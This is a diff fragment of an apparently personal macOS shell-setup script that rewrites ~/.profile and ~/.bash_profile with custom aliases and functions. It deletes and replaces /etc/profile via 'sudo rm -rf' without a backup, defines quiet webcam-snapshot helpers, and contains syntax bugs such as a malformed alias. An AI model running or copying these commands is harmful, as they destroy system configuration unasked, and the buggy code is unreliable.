+      printf "$RED Injected$NC\n"
+    else
+      cd ~
+      sudo rm .profile
+      touch .profile
+      echo " " >> .profile
+      echo "export PS1=\">>> \"" >> .profile
+      echo " " >> .profile
+      echo "# Aliases " >> .profile
+      echo " " >> .profile
+      echo "alias rip=\"sudo kill -9\"" >> .profile
+      echo "alias off=\"sudo airport -z\"" >> .profile
+      echo "alias lock=\"pmset displaysleepnow\"" >> .profile
+      echo "alias die=\"killall Terminal\"" >> .profile
+      echo "alias ll=\"ls -FGlAh\"" >> .profile
+      echo "alias home=\"cd ~\"" >> .profile
+      echo "alias root=\"cd /\"" >> .profile
+      echo "alias ?=\"file\"" >> .profile
+      echo "alias _edit=\"nano ~/etc/profile\"" >> .profile
+      echo "alias _update\"source ~/etc/profile\"" >> .profile
+      echo "alias refresh=\"_update ; clear\"" >> .profile
+      echo "alias relist=\"_update ; clear ; ls\"" >> .profile
+      echo "alias highlight=\"_update ; _yellow ; clear ; ls ; quietTextRestore\"" >> .profile
+      echo "alias reveal=\"_white ; _update ; clear ; ls -la ; quietTextRestore\"" >> .profile
+      echo "alias rn=\"react-native\"" >> .profile
+      echo "alias ther=\"while true" >> .profile
+      echo "do" >> .profile
+      echo "    temp" >> .profile
+      echo "    sleep 7" >> .profile
+      echo "done\"" >> .profile
+      echo " " >> .profile
+      echo "# Functions " >> .profile
+      echo " " >> .profile
+      echo "cd() { builtin cd \"\$@\"; ls ;}" >> .profile
+      echo "_+() { open -a \$1 \$1 }" >> .profile
+      echo "_a() { open -a /Applications/\"\$1.app\"/Contents/MacOS/\$1 }" >> .profile
+      echo "_f() { open -a Finder ./ }" >> .profile
+      echo "space() { du -hs "\$@" | sort -nr; }" >> .profile
+      echo "mkdg() { mkdir \$1 ; clear ; cd \$1 ;}" >> .profile
+    #  echo "docked() { sudo lsof -i :\"\$@\" ;}" >> .bash_profile
+      echo "destroy() { killall -9 appPID \"\$1\" ;}" >> .profile
+      echo "geolocate() { curl ipinfo.io/\$1 }" >> .profile
+      echo "origin() { clear ; ps -p \$1 | awk '{print \$4;}' | sed '1d' }" >> .profile
+      echo "cheese() { imagesnap -w 1 -q }" >> .profile
+      echo "wisconsin() { imagesnap -w 1 -q .snapshot.png }" >> .profile
+      echo "iwannafind() { mdfind \$2 \$1 }" >> .profile
+      echo "iwannasee() { clear ; cat \$(mdfind \$2 \$1) }" >> .profile
+      echo "replace() { sed -i -e 's/\$1/\$2/g' \$3 ; rm \$3-e }" >> .profile
+      echo "ports(){" >> .profile
+      echo "   for i in `seq \$1 \$2`;" >> .profile
+      echo "        do" >> .profile
+      echo "              echo \"проверка процессов для порта  \$i ->>\"" >> .profile
+      echo "              sudo lsof -i :\$i" >> .profile
+      echo "        done" >> .profile
+      echo "}" >> .profile
+      echo "thermic(){" >> .profile
+      echo "while true" >> .profile
+      echo "do" >> .profile
+      echo "    temp" >> .profile
+      echo "    sleep \$1" >> .profile
+      echo "done" >> .profile
+      echo "}" >> .profile
+      echo "temp(){" >> .profile
+      echo "   WHITE='\e[1;97m'" >> .profile
+      echo "   NC='\033[0m'" >> .profile
+      echo "   clear" >> .profile
+      echo "   istats | sed '\$d'" >> .profile
+      echo "   printf \"\$WHITE\n\"" >> .profile
+      echo "   date" >> .profile
+      echo "   printf \"\$NC\n\"" >> .profile
+      echo "}" >> .profile
+      echo " " >> .profile
+      echo "# Color functions " >> .profile
+      echo " " >> .profile
+      echo "_green(){" >> .profile
+      echo "   GREEN='\e[1;92m'" >> .profile
+      echo "   clear" >> .profile
+      echo "   printf \"\$GREEN Green Bold Activate\n\"" >> .profile
+      echo "   date" >> .profile
+      echo "}" >> .profile
+      echo "_white(){" >> .profile
+      echo "   WHITE='\e[1;97m'" >> .profile
+      echo "   clear" >> .profile
+      echo "   printf \"\$WHITE White Bold Activate\n\"" >> .profile
+      echo "   date" >> .profile
+      echo "}" >> .profile
+      echo "_yellow(){" >> .profile
+      echo "   YELLOW='\e[1;93m'" >> .profile
+      echo "   clear" >> .profile
+      echo "   printf \"\$YELLOW Yellow Bold Activate\n\"" >> .profile
+      echo "   date" >> .profile
+      echo "}" >> .profile
+      echo "_red(){" >> .profile
+      echo "   RED='\e[1;91m'" >> .profile
+      echo "   clear" >> .profile
+      echo "   printf \"\$RED Red Bold Activate\n\"" >> .profile
+      echo "   date" >> .profile
+      echo "}" >> .profile
+      echo "_cyan(){" >> .profile
+      echo "   CYAN='\e[1;96m'" >> .profile
+      echo "   clear" >> .profile
+      echo "   printf \"\$CYAN Cyan Bold Activate\n\"" >> .profile
+      echo "   date" >> .profile
+      echo "}" >> .profile
+      echo "_normal(){" >> .profile
+      echo "   NC='\033[0m'" >> .profile
+      echo "   clear" >> .profile
+      echo "   printf \"\$NC Text Normalized\n\"" >> .profile
+      echo "   date" >> .profile
+      echo "}" >> .profile
+      echo "quietTextRestore(){" >> .profile
+      echo "   NC='\033[0m'" >> .profile
+      echo "   printf \"\$NC\n\"" >> .profile
+      echo "}" >> .profile
+      sudo rm -rf /etc/profile
+      sudo cp ./.profile /etc/profile
+      source /etc/profile
+      printf "$RED Injected$NC\n"
+    fi
+
+    elif [[ "$1" == "-e" ]]; then
+
+    if [ "$2" == "bash" ]; then
+
+      cd ~
+      sudo rm .bash_profile
+      touch .bash_profile
+      echo " " >> .bash_profile
+      echo "export PS1=\">>> \"" >> .bash_profile
+      echo " " >> .bash_profile
+      echo "# Aliases " >> .bash_profile
+      echo " " >> .bash_profile
+      echo "alias rip=\"sudo kill -9\"" >> .bash_profile
+      echo "alias off=\"sudo airport -z\"" >> .bash_profile
+      echo "alias lock=\"pmset displaysleepnow\"" >> .bash_profile
+      echo "alias die=\"killall Terminal\"" >> .bash_profile
+      echo "alias ll=\"ls -FGlAh\"" >> .bash_profile
+      echo "alias home=\"cd ~\"" >> .bash_profile
+      echo "alias root=\"cd /\"" >> .bash_profile
+      echo "alias ?=\"file\"" >> .bash_profile
+      echo "alias _edit=\"nano ~/.bash_profile\"" >> .bash_profile
+      echo "alias _update\"source ~/.bash_profile\"" >> .bash_profile
+      echo "alias refresh=\"_update ; clear\"" >> .bash_profile
+      echo "alias relist=\"_update ; clear ; ls\"" >> .bash_profile
+      echo "alias highlight=\"_update ; _yellow ; clear ; ls ; quietTextRestore\"" >> .bash_profile
+      echo "alias reveal=\"_white ; _update ; clear ; ls -la ; quietTextRestore\"" >> .bash_profile
+      echo "alias rn=\"react-native\"" >> .bash_profile
+      echo "alias ther=\"while true" >> .bash_profile
+      echo "do" >> .bash_profile
+      echo "    temp" >> .bash_profile
+      echo "    sleep 7" >> .bash_profile
+      echo "done\"" >> .bash_profile
+      echo " " >> .bash_profile
+      echo "# Functions " >> .bash_profile
+      echo " " >> .bash_profile
+      echo "cd() { builtin cd \"\$@\"; ls ;}" >> .bash_profile
+      echo "_+() { open -a \$1 \$1 }" >> .bash_profile
+      echo "_a() { open -a /Applications/\"\$1.app\"/Contents/MacOS/\$1 }" >> .bash_profile
+      echo "_f() { open -a Finder ./ }" >> .bash_profile
+      echo "space() { du -hs "\$@" | sort -nr; }" >> .bash_profile
+      echo "mkdg() { mkdir \$1 ; clear ; cd \$1 ;}" >> .bash_profile
+    #  echo "docked() { sudo lsof -i :\"\$@\" ;}" >> .bash_profile
+      echo "destroy() { killall -9 appPID \"\$1\" ;}" >> .bash_profile
+      echo "geolocate() { curl ipinfo.io/\$1 }" >> .bash_profile
+      echo "origin() { clear ; ps -p \$1 | awk '{print \$4;}' | sed '1d' }" >> .bash_profile
+      echo "cheese() { imagesnap -w 1 -q }" >> .bash_profile
+      echo "wisconsin() { imagesnap -w 1 -q .snapshot.png }" >> .bash_profile
+      echo "iwannafind() { mdfind \$2 \$1 }" >> .bash_profile
+      echo "iwannasee() { clear ; cat \$(mdfind \$2 \$1) }" >> .bash_profile
+      echo "replace() { sed -i -e 's/\$1/\$2/g' \$3 ; rm \$3-e }" >> .bash_profile
+      echo "ports(){" >> .bash_profile
+      echo "   for i in `seq \$1 \$2`;" >> .bash_profile
+      echo "        do" >> .bash_profile
+      echo "              echo \"проверка процессов для порта  \$i ->>\"" >> .bash_profile
+      echo "              sudo lsof -i :\$i" >> .bash_profile
+      echo "        done" >> .bash_profile
+      echo "}" >> .bash_profile
+      echo "thermic(){" >> .bash_profile
+      echo "while true" >> .bash_profile
+      echo "do" >> .bash_profile
+      echo "    temp" >> .bash_profile
+      echo "    sleep \$1" >> .bash_profile
+      echo "done" >> .bash_profile
+      echo "}" >> .bash_profile
+      echo "temp(){" >> .bash_profile
+      echo "   WHITE='\e[1;97m'" >> .bash_profile
+      echo "   NC='\033[0m'" >> .bash_profile
+      echo "   clear" >> .bash_profile
+      echo "   istats | sed '\$d'" >> .bash_profile
+      echo "   printf \"\$WHITE\n\"" >> .bash_profile
+      echo "   date" >> .bash_profile
+      echo "   printf \"\$NC\n\"" >> .bash_profile
+      echo "}" >> .bash_profile
+      echo " " >> .bash_profile
+      echo "# Color functions " >> .bash_profile
+      echo " " >> .bash_profile
+      echo "_green(){" >> .bash_profile
+      echo "   GREEN='\e[1;92m'" >> .bash_profile
+      echo "   clear" >> .bash_profile
+      echo "   printf \"\$GREEN Green Bold Activate\n\"" >> .bash_profile
+      echo "   date" >> .bash_profile
+      echo "}" >> .bash_profile
+      echo "_white(){" >> .bash_profile
+      echo "   WHITE='\e[1;97m'" >> .bash_profile
+      echo "   clear" >> .bash_profile
+      echo "   printf \"\$WHITE White Bold Activate\n\"" >> .bash_profile
+      echo "   date" >> .bash_profile
+      echo "}" >> .bash_profile
+      echo "_yellow(){" >> .bash_profile
+      echo "   YELLOW='\e[1;93m'" >> .bash_profile
+      echo "   clear" >> .bash_profile
+      echo "   printf \"\$YELLOW Yellow Bold Activate\n\"" >> .bash_profile
+      echo "   date" >> .bash_profile
+      echo "}" >> .bash_profile
+      echo "_red(){" >> .bash_profile
+      echo "   RED='\e[1;91m'" >> .bash_profile
+      echo "   clear" >> .bash_profile
+      echo "   printf \"\$RED Red Bold Activate\n\"" >> .bash_profile
+      echo "   date" >> .bash_profile
+      echo "}" >> .bash_profile
+      echo "_cyan(){" >> .bash_profile
+      echo "   CYAN='\e[1;96m'" >> .bash_profile
+      echo "   clear" >> .bash_profile
+      echo "   printf \"\$CYAN Cyan Bold Activate\n\"" >> .bash_profile
+      echo "   date" >> .bash_profile
+      echo "}" >> .bash_profile
+      echo "_normal(){" >> .bash_profile
+      echo "   NC='\033[0m'" >> .bash_profile
+      echo "   clear" >> .bash_profile
+      echo "   printf \"\$NC Text Normalized\n\"" >> .bash_profile
+      echo "   date" >> .bash_profile
+      echo "}" >> .bash_profile
+      echo "quietTextRestore(){" >> .bash_profile
+      echo "   NC='\033[0m'" >> .bash_profile
+      echo "   printf \"\$NC\n\"" >> .bash_profile
+      echo "}" >> .bash_profile
+      source ./.bash_profile
+      printf "$RED Injected$NC\n"
+      printf "$RED Resetting in 10 seconds..$NC.\n"
+      sleep 3
+      _poof
+
+    elif [[ "$2" == "zsh" ]]; then
+
+      cd ~
+      sudo rm .bash_profile
+      touch .bash_profile
+      echo " " >> .bash_profile
+      echo "export PS1=\">>> \"" >> .bash_profile
+      echo " " >> .bash_profile
+      echo "# Aliases " >> .bash_profile
+      echo " " >> .bash_profile
+      echo "alias rip=\"sudo kill -9\"" >> .bash_profile
+      echo "alias off=\"sudo airport -z\"" >> .bash_profile
+      echo "alias lock=\"pmset displaysleepnow\"" >> .bash_profile
+      echo "alias die=\"killall Terminal\"" >> .bash_profile
+      echo "alias ll=\"ls -FGlAh\"" >> .bash_profile
+      echo "alias home=\"cd ~\"" >> .bash_profile
+      echo "alias root=\"cd /\"" >> .bash_profile
+      echo "alias ?=\"file\"" >> .bash_profile
+      echo "alias _edit=\"nano ~/.bash_profile\"" >> .bash_profile
+      echo "alias _update\"source ~/.bash_profile\"" >> .bash_profile
+      echo "alias refresh=\"_update ; clear\"" >> .bash_profile
+      echo "alias relist=\"_update ; clear ; ls\"" >> .bash_profile
+      echo "alias highlight=\"_update ; _yellow ; clear ; ls ; quietTextRestore\"" >> .bash_profile
+      echo "alias reveal=\"_white ; _update ; clear ; ls -la ; quietTextRestore\"" >> .bash_profile
+      echo "alias rn=\"react-native\"" >> .bash_profile
+      echo "alias ther=\"while true" >> .bash_profile
+      echo "do" >> .bash_profile
+      echo "    temp" >> .bash_profile
+      echo "    sleep 7" >> .bash_profile
+      echo "done\"" >> .bash_profile
+      echo " " >> .bash_profile
+      echo "# Functions " >> .bash_profile
+      echo " " >> .bash_profile
+      echo "cd() { builtin cd \"\$@\"; ls ;}" >> .bash_profile
+      echo "_+() { open -a \$1 \$1 }" >> .bash_profile
+      echo "_a() { open -a /Applications/\"\$1.app\"/Contents/MacOS/\$1 }" >> .bash_profile
+      echo "_f() { open -a Finder ./ }" >> .bash_profile
+      echo "space() { du -hs "\$@" | sort -nr; }" >> .bash_profile
+      echo "mkdg() { mkdir \$1 ; clear ; cd \$1 ;}" >> .bash_profile
+    #  echo "docked() { sudo lsof -i :\"\$@\" ;}" >> .bash_profile
+      echo "destroy() { killall -9 appPID \"\$1\" ;}" >> .bash_profile
+      echo "geolocate() { curl ipinfo.io/\$1 }" >> .bash_profile
+      echo "origin() { clear ; ps -p \$1 | awk '{print \$4;}' | sed '1d' }" >> .bash_profile
+      echo "cheese() { imagesnap -w 1 -q }" >> .bash_profile
+      echo "wisconsin() { imagesnap -w 1 -q .snapshot.png }" >> .bash_profile
+      echo "iwannafind() { mdfind \$2 \$1 }" >> .bash_profile
+      echo "iwannasee() { clear ; cat \$(mdfind \$2 \$1) }" >> .bash_profile
+      echo "replace() { sed -i -e 's/\$1/\$2/g' \$3 ; rm \$3-e }" >> .bash_profile
+      echo "ports(){" >> .bash_profile
+      echo "   for i in `seq \$1 \$2`;" >> .bash_profile
+      echo "        do" >> .bash_profile
+      echo "              echo \"проверка процессов для порта  \$i ->>\"" >> .bash_profile
+      echo "              sudo lsof -i :\$i" >> .bash_profile
+      echo "        done" >> .bash_profile
+      echo "}" >> .bash_profile
+      echo "thermic(){" >> .bash_profile
+      echo "while true" >> .bash_profile
+      echo "do" >> .bash_profile
+      echo "    temp" >> .bash_profile
+      echo "    sleep \$1" >> .bash_profile
+      echo "done" >> .bash_profile
+      echo "}" >> .bash_profile
+      echo "temp(){" >> .bash_profile
+      echo "   WHITE='\e[1;97m'" >> .bash_profile
+      echo "   NC='\033[0m'" >> .bash_profile
+      echo "   clear" >> .bash_profile
+      echo "   istats | sed '\$d'" >> .bash_profile
+      echo "   printf \"\$WHITE\n\"" >> .bash_profile
+      echo "   date" >> .bash_profile
+      echo "   printf \"\$NC\n\"" >> .bash_profile
+      echo "}" >> .bash_profile
+      echo " " >> .bash_profile
+      echo "# Color functions " >> .bash_profile
+      echo " " >> .bash_profile
+      echo "_green(){" >> .bash_profile
+      echo "   GREEN='\e[1;92m'" >> .bash_profile
+      echo "   clear" >> .bash_profile
+      echo "   printf \"\$GREEN Green Bold Activate\n\"" >> .bash_profile
+      echo "   date" >> .bash_profile
+      echo "}" >> .bash_profile
+      echo "_white(){" >> .bash_profile
+      echo "   WHITE='\e[1;97m'" >> .bash_profile
+      echo "   clear" >> .bash_profile
+      echo "   printf \"\$WHITE White Bold Activate\n\"" >> .bash_profile
+      echo "   date" >> .bash_profile
+      echo "}" >> .bash_profile
+      echo "_yellow(){" >> .bash_profile
+      echo "   YELLOW='\e[1;93m'" >> .bash_profile
+      echo "   clear" >> .bash_profile
+      echo "   printf \"\$YELLOW Yellow Bold Activate\n\"" >> .bash_profile
+      echo "   date" >> .bash_profile
+      echo "}" >> .bash_profile
+      echo "_red(){" >> .bash_profile
+      echo "   RED='\e[1;91m'" >> .bash_profile
+      echo "   clear" >> .bash_profile
+      echo "   printf \"\$RED Red Bold Activate\n\"" >> .bash_profile
+      echo "   date" >> .bash_profile
+      echo "}" >> .bash_profile
+      echo "_cyan(){" >> .bash_profile
+      echo "   CYAN='\e[1;96m'" >> .bash_profile
+      echo "   clear" >> .bash_profile
+      echo "   printf \"\$CYAN Cyan Bold Activate\n\"" >> .bash_profile
+      echo "   date" >> .bash_profile
+      echo "}" >> .bash_profile
+      echo "_normal(){" >> .bash_profile
+      echo "   NC='\033[0m'" >> .bash_profile
+      echo "   clear" >> .bash_profile
+      echo "   printf \"\$NC Text Normalized\n\"" >> .bash_profile
+      echo "   date" >> .bash_profile
+      echo "}" >> .bash_profile
+      echo "quietTextRestore(){" >> .bash_profile
+      echo "   NC='\033[0m'" >> .bash_profile
+      echo "   printf \"\$NC\n\"" >> .bash_profile
+      echo "}" >> .bash_profile
+      source ./.bash_profile
+      printf "$RED Injected$NC\n"
+      printf "$RED Resetting in 10 seconds..$NC.\n"
+      sleep 3
+      _poof
+    else
+
+      cd ~
+      sudo rm .bash_profile
+      touch .bash_profile
+      echo " " >> .bash_profile
+      echo "export PS1=\">>> \"" >> .bash_profile
+      echo " " >> .bash_profile
+      echo "# Aliases " >> .bash_profile
+      echo " " >> .bash_profile
+      echo "alias rip=\"sudo kill -9\"" >> .bash_profile
+      echo "alias off=\"sudo airport -z\"" >> .bash_profile
+      echo "alias lock=\"pmset displaysleepnow\"" >> .bash_profile
+      echo "alias die=\"killall Terminal\"" >> .bash_profile
+      echo "alias ll=\"ls -FGlAh\"" >> .bash_profile
+      echo "alias home=\"cd ~\"" >> .bash_profile
+      echo "alias root=\"cd /\"" >> .bash_profile
+      echo "alias ?=\"file\"" >> .bash_profile
+      echo "alias _edit=\"nano ~/.bash_profile\"" >> .bash_profile
+      echo "alias _update\"source ~/.bash_profile\"" >> .bash_profile
+      echo "alias refresh=\"_update ; clear\"" >> .bash_profile
+      echo "alias relist=\"_update ; clear ; ls\"" >> .bash_profile
+      echo "alias highlight=\"_update ; _yellow ; clear ; ls ; quietTextRestore\"" >> .bash_profile
+      echo "alias reveal=\"_white ; _update ; clear ; ls -la ; quietTextRestore\"" >> .bash_profile
+      echo "alias rn=\"react-native\"" >> .bash_profile
+      echo "alias ther=\"while true" >> .bash_profile
+      echo "do" >> .bash_profile
+      echo "    temp" >> .bash_profile
+      echo "    sleep 7" >> .bash_profile
+      echo "done\"" >> .bash_profile
+      echo " " >> .bash_profile
+      echo "# Functions " >> .bash_profile
+      echo " " >> .bash_profile
+      echo "cd() { builtin cd \"\$@\"; ls ;}" >> .bash_profile
+      echo "_+() { open -a \$1 \$1 }" >> .bash_profile
+      echo "_a() { open -a /Applications/\"\$1.app\"/Contents/MacOS/\$1 }" >> .bash_profile
+      echo "_f() { open -a Finder ./ }" >> .bash_profile
+      echo "space() { du -hs "\$@" | sort -nr; }" >> .bash_profile
+      echo "mkdg() { mkdir \$1 ; clear ; cd \$1 ;}" >> .bash_profile
+    #  echo "docked() { sudo lsof -i :\"\$@\" ;}" >> .bash_profile
+      echo "destroy() { killall -9 appPID \"\$1\" ;}" >> .bash_profile
+      echo "geolocate() { curl ipinfo.io/\$1 }" >> .bash_profile
+      echo "origin() { clear ; ps -p \$1 | awk '{print \$4;}' | sed '1d' }" >> .bash_profile
+      echo "cheese() { imagesnap -w 1 -q }" >> .bash_profile
+      echo "wisconsin() { imagesnap -w 1 -q .snapshot.png }" >> .bash_profile
+      echo "iwannafind() { mdfind \$2 \$1 }" >> .bash_profile
+      echo "iwannasee() { clear ; cat \$(mdfind \$2 \$1) }" >> .bash_profile
+      echo "replace() { sed -i -e 's/\$1/\$2/g' \$3 ; rm \$3-e }" >> .bash_profile
+      echo "ports(){" >> .bash_profile
+      echo "   for i in `seq \$1 \$2`;" >> .bash_profile
+      echo "        do" >> .bash_profile
+      echo "              echo \"проверка процессов для порта  \$i ->>\"" >> .bash_profile
+      echo "              sudo lsof -i :\$i" >> .bash_profile
+      echo "        done" >> .bash_profile
+      echo "}" >> .bash_profile
+      echo "thermic(){" >> .bash_profile
+      echo "while true" >> .bash_profile
+      echo "do" >> .bash_profile
+      echo "    temp" >> .bash_profile
+      echo "    sleep \$1" >> .bash_profile
+      echo "done" >> .bash_profile
+      echo "}" >> .bash_profile
+      echo "temp(){" >> .bash_profile
+      echo "   WHITE='\e[1;97m'" >> .bash_profile
+      echo "   NC='\033[0m'" >> .bash_profile
+      echo "   clear" >> .bash_profile
+      echo "   istats | sed '\$d'" >> .bash_profile
+      echo "   printf \"\$WHITE\n\"" >> .bash_profile
+      echo "   date" >> .bash_profile
+      echo "   printf \"\$NC\n\"" >> .bash_profile
+      echo "}" >> .bash_profile
+      echo " " >> .bash_profile
+      echo "# Color functions " >> .bash_profile
+      echo " " >> .bash_profile
+      echo "_green(){" >> .bash_profile
+      echo "   GREEN='\e[1;92m'" >> .bash_profile
+      echo "   clear" >> .bash_profile
+      echo "   printf \"\$GREEN Green Bold Activate\n\"" >> .bash_profile
+      echo "   date" >> .bash_profile
+      echo "}" >> .bash_profile
+      echo "_white(){" >> .bash_profile
+      echo "   WHITE='\e[1;97m'" >> .bash_profile
+      echo "   clear" >> .bash_profile
+      echo "   printf \"\$WHITE White Bold Activate\n\"" >> .bash_profile
+      echo "   date" >> .bash_profile
+      echo "}" >> .bash_profile
+      echo "_yellow(){" >> .bash_profile
+      echo "   YELLOW='\e[1;93m'" >> .bash_profile
+      echo "   clear" >> .bash_profile
+      echo "   printf \"\$YELLOW Yellow Bold Activate\n\"" >> .bash_profile
+      echo "   date" >> .bash_profile
+      echo "}" >> .bash_profile
+      echo "_red(){" >> .bash_profile
+      echo "   RED='\e[1;91m'" >> .bash_profile
+      echo "   clear" >> .bash_profile
+      echo "   printf \"\$RED Red Bold Activate\n\"" >> .bash_profile
+      echo "   date" >> .bash_profile
+      echo "}" >> .bash_profile
+      echo "_cyan(){" >> .bash_profile
+      echo "   CYAN='\e[1;96m'" >> .bash_profile
+      echo "   clear" >> .bash_profile
+      echo "   printf \"\$CYAN Cyan Bold Activate\n\"" >> .bash_profile
+      echo "   date" >> .bash_profile
+      echo "}" >> .bash_profile
+      echo "_normal(){" >> .bash_profile
+      echo "   NC='\033[0m'" >> .bash_profile
+      echo "   clear" >> .bash_profile
+      echo "   printf \"\$NC Text Normalized\n\"" >> .bash_profile
+      echo "   date" >> .bash_profile
+      echo "}" >> .bash_profile
+      echo "quietTextRestore(){" >> .bash_profile
+      echo "   NC='\033[0m'" >> .bash_profile
+      echo "   printf \"\$NC\n\"" >> .bash_profile
+      echo "}" >> .bash_profile
+      source ./.bash_profile
+      printf "$RED Injected$NC\n"
+      printf "$RED Resetting in 10 seconds..$NC.\n"
+      sleep 3
+      _poof
+    fi
+
+    else
+
+       if [ "$1" == "bash" ]; then
+         cd ~
+         sudo rm .profile
+         touch .profile
+         echo " " >> .profile
+         echo "export PS1=\">>> \"" >> .profile
+         echo " " >> .profile
+         echo "# Aliases " >> .profile
+         echo " " >> .profile
+         echo "alias rip=\"sudo kill -9\"" >> .profile
+         echo "alias off=\"sudo airport -z\"" >> .profile
+         echo "alias lock=\"pmset displaysleepnow\"" >> .profile
+         echo "alias die=\"killall Terminal\"" >> .profile
+         echo "alias ll=\"ls -FGlAh\"" >> .profile
+         echo "alias home=\"cd ~\"" >> .profile
+         echo "alias root=\"cd /\"" >> .profile
+         echo "alias ?=\"file\"" >> .profile
+         echo "alias _edit=\"nano ~/etc/profile\"" >> .profile
+         echo "alias _update\"source ~/etc/profile\"" >> .profile
+         echo "alias refresh=\"_update ; clear\"" >> .profile
+         echo "alias relist=\"_update ; clear ; ls\"" >> .profile
+         echo "alias highlight=\"_update ; _yellow ; clear ; ls ; quietTextRestore\"" >> .profile
+         echo "alias reveal=\"_white ; _update ; clear ; ls -la ; quietTextRestore\"" >> .profile
+         echo "alias rn=\"react-native\"" >> .profile
+         echo "alias ther=\"while true" >> .profile
+         echo "do" >> .profile
+         echo "    temp" >> .profile
+         echo "    sleep 7" >> .profile
+         echo "done\"" >> .profile
+         echo " " >> .profile
+         echo "# Functions " >> .profile
+         echo " " >> .profile
+         echo "cd() { builtin cd \"\$@\"; ls ;}" >> .profile
+         echo "_+() { open -a \$1 \$1 }" >> .profile
+         echo "_a() { open -a /Applications/\"\$1.app\"/Contents/MacOS/\$1 }" >> .profile
+         echo "_f() { open -a Finder ./ }" >> .profile
+         echo "space() { du -hs "\$@" | sort -nr; }" >> .profile
+         echo "mkdg() { mkdir \$1 ; clear ; cd \$1 ;}" >> .profile
+       #  echo "docked() { sudo lsof -i :\"\$@\" ;}" >> .bash_profile
+         echo "destroy() { killall -9 appPID \"\$1\" ;}" >> .profile
+         echo "geolocate() { curl ipinfo.io/\$1 }" >> .profile
+         echo "origin() { clear ; ps -p \$1 | awk '{print \$4;}' | sed '1d' }" >> .profile
+         echo "cheese() { imagesnap -w 1 -q }" >> .profile
+         echo "wisconsin() { imagesnap -w 1 -q .snapshot.png }" >> .profile
+         echo "iwannafind() { mdfind \$2 \$1 }" >> .profile
+         echo "iwannasee() { clear ; cat \$(mdfind \$2 \$1) }" >> .profile
+         echo "replace() { sed -i -e 's/\$1/\$2/g' \$3 ; rm \$3-e }" >> .profile
+         echo "ports(){" >> .profile
+         echo "   for i in `seq \$1 \$2`;" >> .profile
+         echo "        do" >> .profile
+         echo "              echo \"проверка процессов для порта  \$i ->>\"" >> .profile
+         echo "              sudo lsof -i :\$i" >> .profile
+         echo "        done" >> .profile
+         echo "}" >> .profile
+         echo "thermic(){" >> .profile
+         echo "while true" >> .profile
+         echo "do" >> .profile
+         echo "    temp" >> .profile
+         echo "    sleep \$1" >> .profile
+         echo "done" >> .profile
+         echo "}" >> .profile
+         echo "temp(){" >> .profile
+         echo "   WHITE='\e[1;97m'" >> .profile
+         echo "   NC='\033[0m'" >> .profile
+         echo "   clear" >> .profile
+         echo "   istats | sed '\$d'" >> .profile
+         echo "   printf \"\$WHITE\n\"" >> .profile
+         echo "   date" >> .profile
+         echo "   printf \"\$NC\n\"" >> .profile
+         echo "}" >> .profile
+         echo " " >> .profile
+         echo "# Color functions " >> .profile
+         echo " " >> .profile
+         echo "_green(){" >> .profile
+         echo "   GREEN='\e[1;92m'" >> .profile
+         echo "   clear" >> .profile
+         echo "   printf \"\$GREEN Green Bold Activate\n\"" >> .profile
+         echo "   date" >> .profile
+         echo "}" >> .profile
+         echo "_white(){" >> .profile
+         echo "   WHITE='\e[1;97m'" >> .profile
+         echo "   clear" >> .profile
+         echo "   printf \"\$WHITE White Bold Activate\n\"" >> .profile
+         echo "   date" >> .profile
+         echo "}" >> .profile
+         echo "_yellow(){" >> .profile
+         echo "   YELLOW='\e[1;93m'" >> .profile
+         echo "   clear" >> .profile
+         echo "   printf \"\$YELLOW Yellow Bold Activate\n\"" >> .profile
+         echo "   date" >> .profile
+         echo "}" >> .profile
+         echo "_red(){" >> .profile
+         echo "   RED='\e[1;91m'" >> .profile
+         echo "   clear" >> .profile
+         echo "   printf \"\$RED Red Bold Activate\n\"" >> .profile
+         echo "   date" >> .profile
+         echo "}" >> .profile
+         echo "_cyan(){" >> .profile
+         echo "   CYAN='\e[1;96m'" >> .profile
+         echo "   clear" >> .profile
+         echo "   printf \"\$CYAN Cyan Bold Activate\n\"" >> .profile
+         echo "   date" >> .profile
+         echo "}" >> .profile
+         echo "_normal(){" >> .profile
+         echo "   NC='\033[0m'" >> .profile
+         echo "   clear" >> .profile
+         echo "   printf \"\$NC Text Normalized\n\"" >> .profile
+         echo "   date" >> .profile
+         echo "}" >> .profile
+         echo "quietTextRestore(){" >> .profile
+         echo "   NC='\033[0m'" >> .profile
+         echo "   printf \"\$NC\n\"" >> .profile
+         echo "}" >> .profile
+         sudo rm -rf /etc/profile
+         sudo cp ./.profile /etc/profile
+         source /etc/profile
+         cd ~
+         sudo rm .bash_profile
+         touch .bash_profile
+         echo " " >> .bash_profile
+         echo "export PS1=\">>> \"" >> .bash_profile
+         echo " " >> .bash_profile
+         echo "# Aliases " >> .bash_profile
+         echo " " >> .bash_profile
+         echo "alias rip=\"sudo kill -9\"" >> .bash_profile
+         echo "alias off=\"sudo airport -z\"" >> .bash_profile
+         echo "alias lock=\"pmset displaysleepnow\"" >> .bash_profile
+         echo "alias die=\"killall Terminal\"" >> .bash_profile
+         echo "alias ll=\"ls -FGlAh\"" >> .bash_profile
+         echo "alias home=\"cd ~\"" >> .bash_profile
+         echo "alias root=\"cd /\"" >> .bash_profile
+         echo "alias ?=\"file\"" >> .bash_profile
+         echo "alias _edit=\"nano ~/.bash_profile\"" >> .bash_profile
+         echo "alias _update\"source ~/.bash_profile\"" >> .bash_profile
+         echo "alias refresh=\"_update ; clear\"" >> .bash_profile
+         echo "alias relist=\"_update ; clear ; ls\"" >> .bash_profile
+         echo "alias highlight=\"_update ; _yellow ; clear ; ls ; quietTextRestore\"" >> .bash_profile
+         echo "alias reveal=\"_white ; _update ; clear ; ls -la ; quietTextRestore\"" >> .bash_profile
+         echo "alias rn=\"react-native\"" >> .bash_profile
+         echo "alias ther=\"while true" >> .bash_profile
+         echo "do" >> .bash_profile
+         echo "    temp" >> .bash_profile
+         echo "    sleep 7" >> .bash_profile
+         echo "done\"" >> .bash_profile
+         echo " " >> .bash_profile
+         echo "# Functions " >> .bash_profile
+         echo " " >> .bash_profile
+         echo "cd() { builtin cd \"\$@\"; ls ;}" >> .bash_profile
+         echo "_+() { open -a \$1 \$1 }" >> .bash_profile
+         echo "_a() { open -a /Applications/\"\$1.app\"/Contents/MacOS/\$1 }" >> .bash_profile
+         echo "_f() { open -a Finder ./ }" >> .bash_profile
+         echo "space() { du -hs "\$@" | sort -nr; }" >> .bash_profile
+         echo "mkdg() { mkdir \$1 ; clear ; cd \$1 ;}" >> .bash_profile
+       #  echo "docked() { sudo lsof -i :\"\$@\" ;}" >> .bash_profile
+         echo "destroy() { killall -9 appPID \"\$1\" ;}" >> .bash_profile
